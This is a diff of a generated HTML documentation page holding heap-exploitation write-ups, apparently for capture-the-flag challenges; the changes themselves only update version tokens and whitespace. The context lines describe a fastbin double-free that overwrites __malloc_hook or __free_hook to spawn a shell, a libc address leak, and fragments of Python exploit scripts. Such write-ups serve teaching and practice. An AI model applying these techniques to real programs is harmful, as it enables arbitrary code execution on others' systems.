@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <meta name="turbo-root" content="/odc">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="2.4.0.726857580248">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="2.4.0.726929069052">
 
     <!-- See retype.com -->
     <meta name="generator" content="Retype 2.4.0">
@@ -31,12 +31,12 @@
 
     <script>(function () { var el = document.documentElement, m = localStorage.getItem("/odc/doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
-    <link href="../resources/css/retype.css?v=2.4.0.726857580248" rel="stylesheet" />
+    <link href="../resources/css/retype.css?v=2.4.0.726929069052" rel="stylesheet" />
 
-    <script type="text/javascript" src="../resources/js/config.js?v=2.4.0.726857580248" data-turbo-eval="false" defer></script>
+    <script type="text/javascript" src="../resources/js/config.js?v=2.4.0.726929069052" data-turbo-eval="false" defer></script>
     <script type="text/javascript" src="../resources/js/retype.js?v=2.4.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" type="text/javascript" src="../resources/js/lunr.js?v=2.4.0.726857580248" data-turbo-eval="false" defer></script>
-    <script id="prism-js" type="text/javascript" src="../resources/js/prism.js?v=2.4.0.726857580248" defer></script>
+    <script id="lunr-js" type="text/javascript" src="../resources/js/lunr.js?v=2.4.0.726929069052" data-turbo-eval="false" defer></script>
+    <script id="prism-js" type="text/javascript" src="../resources/js/prism.js?v=2.4.0.726929069052" defer></script>
     <link href="../resources/css/katex.css?v=2.4.0" rel="stylesheet" />
     <script id="katex-js" type="text/javascript" src="../resources/js/katex.js?v=2.4.0" defer></script>
 </head>
@@ -344,7 +344,7 @@ else {
 <pre class="language-c"><code v-pre class="language-c">void write_entry(void)
 
 {
-  int i; 
+  int i;
   printf(&quot;Index: &quot;);
   i = read_integer();
   if ((i &lt; 0) || (99 &lt; i)) {
@@ -399,7 +399,7 @@ else {
 <li><p>vulnerability: <code v-pre>read_entry</code>, can be used to leak stuff.</p>
 </li>
 <li><p>vulnerability: <code v-pre>free_entry</code>, we can free more than once chunks -&gt; fastbin attack to make <code v-pre>malloc</code> allocate something in memory: the address of <code v-pre>system()</code> into either <code v-pre>__free_hook</code> or <code v-pre>__malloc_hook</code>.</p>
-<p>More specifically when overwriting <code v-pre>__free_hook</code> we overwrite it with <code v-pre>system</code> and we pass <code v-pre>/bin/sh</code> to it. Instead when we overwrite <code v-pre>__malloc_hook</code>  we use <code v-pre>one_gadget</code> since the parameter of the <code v-pre>malloc</code> is a number, not a string.</p>
+<p>More specifically when overwriting <code v-pre>__free_hook</code> we overwrite it with <code v-pre>system</code> and we pass <code v-pre>/bin/sh</code> to it. Instead when we overwrite <code v-pre>__malloc_hook</code> we use <code v-pre>one_gadget</code> since the parameter of the <code v-pre>malloc</code> is a number, not a string.</p>
 </li>
 </ol>
 <doc-anchor-target id="the-exploit-in-practice">
@@ -482,7 +482,7 @@ print(&quot;[!] libc_base: %#x&quot; % libc_base)</code></pre>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-python"><code v-pre class="language-python">chunk_a = alloc(0x200)
 free(chunk_a)
-print(chunk_a, read(chunk_a))    </code></pre>
+print(chunk_a, read(chunk_a))</code></pre>
 </doc-codeblock></div>
 <p>This happens because when we have only one chunk it will contain a random libc address, from which we can compute the address of the base of the libc. To find the offset we will use <code v-pre>vmmap</code> in gdb.</p>
 <p><strong>Part 2: exploiting <del><code v-pre>__free_hook</code></del> <code v-pre>__malloc_hook</code> to spawn a shell</strong></p>
@@ -546,7 +546,7 @@ free_chunk(chunk_c)
 chunk_c = alloc(size)
 write_chunk(chunk_c, p64(malloc_hook-0x23))
 
-alloc(size)             
+alloc(size)
 alloc(size)
 
 # with the following call to alloc()
@@ -807,7 +807,7 @@ Size: 0x20ee1</code></pre>
   __stack_chk_fail();
 }</code></pre>
 </doc-codeblock></div>
-<p>To bypass the null byte overflow mitigation we need to exploit the <code v-pre>rename_pokemon</code> function, and fill a buffer which should contain a pokemon name with fake previous sizes. This is the function that calls <code v-pre>get_string</code>:</p>
+<p>To bypass the null byte overflow mitigation we need to exploit the <code v-pre>rename_pokemon</code> function, and fill a buffer which should contain a pokemon name with fake previous sizes. This is the function that calls <code v-pre>get_string</code>:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-c"><code v-pre class="language-c">void rename_pkm(void) {
   pkm *ppVar1;
@@ -1133,7 +1133,7 @@ rename_handler(r, pkFIN, len(formatter(p)), formatter(p))
 leak = info_handler(r, pkB2)
 libcleak = hex(unpack(leak[0], 'all', endian='little', sign=False))
 print(colors['red'] + 'libc leak: {}'.format(hex(int(libcleak, 16))))
-printer(colors['cyan'] + </code></pre>
+printer(colors['cyan'] +</code></pre>
 </doc-codeblock></div>
 <p>So we have a two stage exploit:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
